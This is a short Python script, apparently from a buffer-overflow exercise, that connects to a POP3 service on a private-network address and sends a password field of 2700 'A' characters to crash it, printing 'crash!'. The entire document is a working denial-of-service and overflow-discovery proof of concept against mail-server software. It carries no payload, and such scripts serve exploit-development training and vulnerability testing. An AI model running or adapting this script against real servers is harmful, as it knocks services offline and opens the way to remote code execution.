import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print('connecting....')
s.connect(('192.168.31.154', 110))
s.recv(1024)
s.send('USER test\r\n')
s.recv(1024)
print 'send password...'
s.send('PASS ' + 'A'*2700 + '\r\n')
s.recv(1024)
print 'crash!'
